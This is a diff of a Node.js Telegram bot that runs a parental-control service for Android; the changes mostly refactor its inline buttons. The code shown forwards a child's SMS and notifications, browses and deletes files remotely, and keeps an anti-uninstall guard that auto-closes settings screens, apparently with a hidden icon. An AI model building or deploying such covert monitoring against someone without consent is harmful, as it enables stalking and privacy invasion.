         `✅ Screen time limit set!\n\n👦 *${escapeMd(dev?.childName)}*\n⏱️ Limit: ${limitText}`,
-        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${devId}`)]] } }
+        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
       );
       return;
     }
@@ -1153,7 +1178,7 @@ function initTelegramBot() {
       if (dev) dev.blockedApps = apps;
       bot.sendMessage(chatId,
         `✅ Block policy update hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n🚫 Blocked: \`${escapeMdCode(apps)}\`\n\n_Apps gulo ekhon theke block thakbe._`,
-        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${devId}`)]] } }
+        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
       );
       return;
     }
@@ -1173,14 +1198,14 @@ function initTelegramBot() {
         sendCommandToDevice(devId, { command: cmd, package: pkg });
         bot.sendMessage(chatId,
           `${cmd === 'block_app' ? '🚫' : '✅'} ${cmd === 'block_app' ? 'Block' : 'Unblock'} command pathano hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n📦 \`${escapeMdCode(pkg)}\``,
-          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${devId}`)]] } }
+          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
         );
       } else {
         const url = val.startsWith('http://') || val.startsWith('https://') ? val : `https://${val}`;
         sendCommandToDevice(devId, { command: 'open_url', url });
         bot.sendMessage(chatId,
           `🔗 URL open command pathano hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n🌐 \`${escapeMdCode(url)}\``,
-          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${devId}`)]] } }
+          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
         );
       }
       return;
@@ -1198,15 +1223,15 @@ function initTelegramBot() {
       sendCommandToDevice(devId, { command: "show_toast", message: msg });
       bot.sendMessage(chatId,
         `✅ Toast pathano hoyeche!\n\n👦 *${escapeMd(dev?.childName)}*\n💬 \`${escapeMdCode(msg)}\``,
-        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${devId}`)]] } }
+        { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${devId}` }]] } }
       );
       return;
     }
 
     // ── Reply keyboard button text handlers ──────────────────────────────
-    if (text === `${EMOJIS.devices} Devices`)  { sendDeviceList(chatId); return; }
-    if (text === `${EMOJIS.status} Status`)   { sendStatus(chatId); return; }
-    if (text === `${EMOJIS.settings} Settings`) {
+    if (text === "📱 Devices")  { sendDeviceList(chatId); return; }
+    if (text === "📊 Status")   { sendStatus(chatId); return; }
+    if (text === "⚙️ Settings") {
       const miniUrl = PUBLIC_URL ? `${PUBLIC_URL}/?tg=1` : null;
       bot.sendMessage(chatId,
         `⚙️ *Settings*\n\n🔑 Token: \`${escapeMdCode(SECURITY_TOKEN)}\`\n🤖 Admin ID: \`${ADMIN_TG_ID}\`\n🌐 Server: \`${escapeMdCode(PUBLIC_URL || "local")}\``,
@@ -1214,21 +1239,21 @@ function initTelegramBot() {
           parse_mode: "Markdown",
           reply_markup: {
             inline_keyboard: miniUrl
-              ? [[webAppButton(`${EMOJIS.panel} Open Full Admin Panel`, miniUrl, 'primary')]]
+              ? [[{ text: "🖥️ Open Full Admin Panel", web_app: { url: miniUrl } }]]
               : []
           }
         }
       );
       return;
     }
-    if (text === `${EMOJIS.panel} Full Panel`) {
+    if (text === "🖥️ Full Panel") {
       if (!PUBLIC_URL) {
         bot.sendMessage(chatId, "❌ PUBLIC_URL set kora nai `.env` e.\nServer HTTPS URL ta add koro.");
         return;
       }
-      bot.sendMessage(chatId, `${EMOJIS.panel} *Full Admin Panel:*`, {
+      bot.sendMessage(chatId, "🖥️ *Full Admin Panel:*", {
         parse_mode: "Markdown",
-        reply_markup: { inline_keyboard: [[webAppButton("🚀 Open Admin Panel", `${PUBLIC_URL}/?tg=1`, 'primary')]] }
+        reply_markup: { inline_keyboard: [[{ text: "🚀 Open Admin Panel", web_app: { url: `${PUBLIC_URL}/?tg=1` } }]] }
       });
       return;
     }
@@ -1257,12 +1282,6 @@ function initTelegramBot() {
     const msgId  = query.message.message_id;
     const data   = query.data;
     const state  = getState(chatId);
-
-    // ── Handle disabled buttons ────────────────────────────────────────
-    if (data === 'disabled') {
-      bot.answerCallbackQuery(query.id, { text: '⏳ This action is currently unavailable.', show_alert: true });
-      return;
-    }
 
     // ── menu: navigation ─────────────────────────────────────────────
     if (data === "menu:devices") {
@@ -1350,16 +1369,16 @@ function initTelegramBot() {
             reply_markup: {
               inline_keyboard: [
                 [
-                  primaryButton("30 min", `st:30:${deviceId}`),
-                  primaryButton("1 ghonta", `st:60:${deviceId}`),
-                  primaryButton("2 ghonta", `st:120:${deviceId}`),
+                  ibtn("30 min",   `st:30:${deviceId}`,  { style: BTN_STYLE.PRIMARY }),
+                  ibtn("1 ghonta", `st:60:${deviceId}`,  { style: BTN_STYLE.PRIMARY }),
+                  ibtn("2 ghonta", `st:120:${deviceId}`, { style: BTN_STYLE.PRIMARY }),
                 ],
                 [
-                  primaryButton("3 ghonta", `st:180:${deviceId}`),
-                  successButton("Unlimited", `st:0:${deviceId}`),
+                  ibtn("3 ghonta",  `st:180:${deviceId}`, { style: BTN_STYLE.PRIMARY }),
+                  ibtn("Unlimited", `st:0:${deviceId}`,   { style: BTN_STYLE.SUCCESS }),
                 ],
-                [secondaryButton("✏️ Notun number tipo", `st:custom:${deviceId}`)],
-                [secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)],
+                [ibtn("Notun number tipo", `st:custom:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.settings })],
+                [ibtn("Back", `sel:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.arrow })],
               ]
             }
           }
@@ -1382,24 +1401,24 @@ function initTelegramBot() {
             reply_markup: {
               inline_keyboard: [
                 [
-                  dangerButton("🎵 TikTok", `blk:com.zhiliaoapp.musically:${deviceId}`),
-                  dangerButton("📸 Instagram", `blk:com.instagram.android:${deviceId}`),
+                  ibtn("🎵 TikTok",    `blk:com.zhiliaoapp.musically:${deviceId}`, { style: BTN_STYLE.DANGER }),
+                  ibtn("📸 Instagram", `blk:com.instagram.android:${deviceId}`,    { style: BTN_STYLE.DANGER }),
                 ],
                 [
-                  dangerButton("👻 Snapchat", `blk:com.snapchat.android:${deviceId}`),
-                  dangerButton("▶️ YouTube", `blk:com.google.android.youtube:${deviceId}`),
+                  ibtn("👻 Snapchat", `blk:com.snapchat.android:${deviceId}`,         { style: BTN_STYLE.DANGER }),
+                  ibtn("▶️ YouTube",  `blk:com.google.android.youtube:${deviceId}`,   { style: BTN_STYLE.DANGER }),
                 ],
                 [
-                  dangerButton("📘 Facebook", `blk:com.facebook.katana:${deviceId}`),
-                  dangerButton("💚 WhatsApp", `blk:com.whatsapp:${deviceId}`),
+                  ibtn("📘 Facebook", `blk:com.facebook.katana:${deviceId}`, { style: BTN_STYLE.DANGER }),
+                  ibtn("💚 WhatsApp", `blk:com.whatsapp:${deviceId}`,        { style: BTN_STYLE.DANGER }),
                 ],
                 [
-                  dangerButton("🎮 PUBG", `blk:com.tencent.ig:${deviceId}`),
-                  dangerButton("🔴 Bigo Live", `blk:com.bigo.live:${deviceId}`),
+                  ibtn("🎮 PUBG",      `blk:com.tencent.ig:${deviceId}`, { style: BTN_STYLE.DANGER }),
+                  ibtn("🔴 Bigo Live", `blk:com.bigo.live:${deviceId}`,  { style: BTN_STYLE.DANGER }),
                 ],
-                [secondaryButton("✏️ Custom package name tipo", `blk:custom:${deviceId}`)],
-                [dangerButton("🗑️ Sob clear koro", `blk:clear:${deviceId}`)],
-                [secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)],
+                [ibtn("✏️ Custom package name tipo", `blk:custom:${deviceId}`, { style: BTN_STYLE.PRIMARY })],
+                [ibtn("Sob clear koro", `blk:clear:${deviceId}`, { style: BTN_STYLE.SUCCESS, icon: EMOJI.check })],
+                [ibtn("Back", `sel:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.arrow })],
               ]
             }
           }
@@ -1458,11 +1477,11 @@ Kon inbox dekhte chao?`, {
           parse_mode: 'Markdown',
           reply_markup: { inline_keyboard: [
             [
-              primaryButton('📥 Inbox', `sms:inbox:${deviceId}`),
-              primaryButton('📤 Sent', `sms:sent:${deviceId}`),
+              { text: '📥 Inbox', callback_data: `sms:inbox:${deviceId}` },
+              { text: '📤 Sent',  callback_data: `sms:sent:${deviceId}`  },
             ],
-            [secondaryButton('📂 All', `sms:all:${deviceId}`)],
-            [secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]
+            [{ text: '📂 All',   callback_data: `sms:all:${deviceId}` }],
+            [{ text: '◀️ Back',  callback_data: `sel:${deviceId}` }]
           ]}
         });
         return;
@@ -1637,10 +1656,10 @@ Kon inbox dekhte chao?`, {
           {
             parse_mode: "Markdown",
             reply_markup: { inline_keyboard: [
-              [successButton("🛡️ ARM Guard", `act:guard_arm:${deviceId}`)],
-              [secondaryButton("⚠️ Disarm (temporary)", `act:guard_disarm:${deviceId}`)],
-              [dangerButton("🗑️ Uninstall Mode", `act:guard_uninstall:${deviceId}`)],
-              [secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${deviceId}`)],
+              [ibtn("ARM Guard",         `act:guard_arm:${deviceId}`,       { style: BTN_STYLE.SUCCESS, icon: EMOJI.shield })],
+              [ibtn("Disarm (temporary)", `act:guard_disarm:${deviceId}`,   { style: BTN_STYLE.DANGER,  icon: EMOJI.warning })],
+              [ibtn("Uninstall Mode",     `act:guard_uninstall:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.trash })],
+              [ibtn("Back to Device",      `sel:${deviceId}`,                 { style: BTN_STYLE.PRIMARY, icon: EMOJI.arrow })],
             ]}
           }
         );
@@ -1654,7 +1673,7 @@ Kon inbox dekhte chao?`, {
         if (dev) dev.uninstallGuard = enable;
         bot.sendMessage(chatId,
           `🛡️ Self-protect guard *${enable ? "ARMED" : "DISARMED"}* on *${escapeMd(dev.childName)}*${enable ? "" : "\n\n⚠️ Ekhon Settings theke app manage/uninstall kora jete pare — satarke kaj koro."}`,
-          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${deviceId}`)]] } }
+          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${deviceId}` }]] } }
         );
         return;
       }
@@ -1665,7 +1684,7 @@ Kon inbox dekhte chao?`, {
         if (dev) dev.uninstallGuard = false;
         bot.sendMessage(chatId,
           `🗑️ *Uninstall Mode* pathano hoyeche — *${escapeMd(dev.childName)}*\n\nGuard off + device-admin remove + icon show hobe. App ta uninstall korar jonno ekhon device ta hat-e niye confirm koro.`,
-          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${deviceId}`)]] } }
+          { parse_mode: "Markdown", reply_markup: { inline_keyboard: [[{ text: "◀️ Back to Device", callback_data: `sel:${deviceId}` }]] } }
         );
         return;
       }
@@ -1941,11 +1960,11 @@ Kon inbox dekhte chao?`, {
             reply_markup: {
               inline_keyboard: [
                 [
-                  successButton(`${EMOJIS.download} Download`, `fb:dl:${devId}:${getCachedPathKey(filePath)}`),
-                  dangerButton(`${EMOJIS.delete} Delete`, `fb:del:${devId}:${getCachedPathKey(filePath)}`),
+                  ibtn('Download', `fb:dl:${devId}:${getCachedPathKey(filePath)}`,  { style: BTN_STYLE.SUCCESS, icon: EMOJI.download }),
+                  ibtn('Delete',   `fb:del:${devId}:${getCachedPathKey(filePath)}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.trash }),
                 ],
                 [
-                  secondaryButton(`${EMOJIS.back} Back to folder`, `fb:nav:${devId}:${getCachedPathKey(filePath.substring(0, filePath.lastIndexOf('/')))}:all`),
+                  ibtn('Back to folder', `fb:nav:${devId}:${getCachedPathKey(filePath.substring(0, filePath.lastIndexOf('/')))}:all`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.arrow }),
                 ]
               ]
             }
@@ -1993,8 +2012,8 @@ Nischit delete korte chao?`,
             parse_mode: 'Markdown',
             reply_markup: {
               inline_keyboard: [[
-                dangerButton('✅ Ha, delete koro', `fb:delok:${devId}:${getCachedPathKey(filePath)}`),
-                secondaryButton('❌ Cancel', `fb:file:${devId}:${getCachedPathKey(filePath)}`),
+                ibtn('Ha, delete koro', `fb:delok:${devId}:${getCachedPathKey(filePath)}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.trash }),
+                ibtn('Cancel',          `fb:file:${devId}:${getCachedPathKey(filePath)}`,  { style: BTN_STYLE.PRIMARY, icon: EMOJI.cross }),
               ]]
             }
           }
@@ -2053,7 +2072,7 @@ function notifyDeviceConnected(deviceId, childName, battery) {
     {
       reply_markup: {
         inline_keyboard: [[
-          primaryButton(`📱 Manage ${childName}`, `sel:${deviceId}`)
+          { text: `📱 Manage ${childName}`, callback_data: `sel:${deviceId}` }
         ]]
       }
     }
@@ -2073,7 +2092,7 @@ function notifyAppBlocked(deviceId, childName, appName, packageName, time) {
     {
       reply_markup: {
         inline_keyboard: [[
-          primaryButton(`📱 View ${childName}`, `sel:${deviceId}`)
+          { text: `📱 View ${childName}`, callback_data: `sel:${deviceId}` }
         ]]
       }
     }
@@ -2087,7 +2106,7 @@ function notifyBatteryLow(deviceId, childName, battery) {
     {
       reply_markup: {
         inline_keyboard: [[
-          dangerButton("🔒 Lock Device", `act:lock:${deviceId}`)
+          { text: "🔒 Lock Device", callback_data: `act:lock:${deviceId}` }
         ]]
       }
     }
@@ -2485,7 +2504,7 @@ wss.on('connection', (ws, req) => {
               dev._lastNotifKey = notifKey;
               notifyAdmin(
                 `🔔 *Notification — ${escapeMd(dev.childName)}*\n\n📱 App: \`${escapeMdCode(appLabel)}\`\n📝 ${escapeMd(msgTitle)}\n💬 ${msgText.length > 200 ? escapeMd(msgText.slice(0,200))+'…' : escapeMd(msgText)}\n🕐 ${notifTime}`,
-                { reply_markup: { inline_keyboard: [[primaryButton('📱 View '+dev.childName, 'sel:'+deviceId)]] } }
+                { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
               );
             }
           }
@@ -2530,7 +2549,7 @@ wss.on('connection', (ws, req) => {
                 `🆔 Device ID: \`${giPayload.device_id}\`\n` +
                 `⏱ Screen Used: *${giPayload.screen_time_used} min*\n` +
                 `🚫 Blocked Apps: \`${escapeMdCode(giPayload.blocked_apps || 'none')}\``,
-                { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } }
+                { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } }
               );
             }
           }
@@ -2574,7 +2593,7 @@ wss.on('connection', (ws, req) => {
               `🆔 Device ID: \`${p.device_id}\`\n` +
               `⏱ Screen Used: *${p.screen_time_used} min*\n` +
               `🚫 Blocked Apps: \`${escapeMdCode(p.blocked_apps || 'none')}\``,
-              { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[secondaryButton(`${EMOJIS.back} Back`, `sel:${deviceId}`)]] } }
+              { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '◀️ Back', callback_data: `sel:${deviceId}` }]] } }
             );
           }
 
@@ -2620,7 +2639,7 @@ wss.on('connection', (ws, req) => {
               `Child ${dir} the safe zone\n` +
               `📏 Distance from center: *${payload.distanceM}m* (radius ${payload.radiusM}m)\n` +
               `🗺️ https://www.google.com/maps?q=${payload.lat},${payload.lng}\n🕐 ${t}`,
-              { reply_markup: { inline_keyboard: [[primaryButton('📱 View '+dev.childName, 'sel:'+deviceId)]] } }
+              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
             );
           }
 
@@ -2633,7 +2652,7 @@ wss.on('connection', (ws, req) => {
             const verb = ev === 'installed' ? 'was INSTALLED' : (ev === 'updated' ? 'was UPDATED' : 'was UNINSTALLED');
             notifyAdmin(
               `${emoji} *App ${verb}* on ${escapeMd(dev.childName)}\n\n📦 *${escapeMd(payload.app)}*\n\`${escapeMdCode(payload.package)}\`\n🕐 ${t}`,
-              { reply_markup: { inline_keyboard: [[primaryButton('📱 View '+dev.childName, 'sel:'+deviceId)]] } }
+              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
             );
           }
 
@@ -2808,7 +2827,7 @@ wss.on('connection', (ws, req) => {
                     {
                       chat_id: chatId2, message_id: pendingAll.msgId, parse_mode: 'Markdown',
                       reply_markup: { inline_keyboard: [[
-                        secondaryButton(`${EMOJIS.back} Back to Device`, `sel:${deviceId}`)
+                        { text: '◀️ Back to Device', callback_data: `sel:${deviceId}` }
                       ]]}
                     }
                   ).catch(() =>
@@ -2861,7 +2880,7 @@ wss.on('connection', (ws, req) => {
           if (bot) {
             notifyAdmin(
               `🛡️ *Self-protection triggered — ${escapeMd(dev.childName)}*\n\n${escapeMd(payload.detail || 'Uninstall / app-management screen was auto-closed.')}\n🕐 ${gTime}`,
-              { reply_markup: { inline_keyboard: [[primaryButton('📱 View '+dev.childName, 'sel:'+deviceId)]] } }
+              { reply_markup: { inline_keyboard: [[{ text: '📱 View '+dev.childName, callback_data: 'sel:'+deviceId }]] } }
             );
           }
 
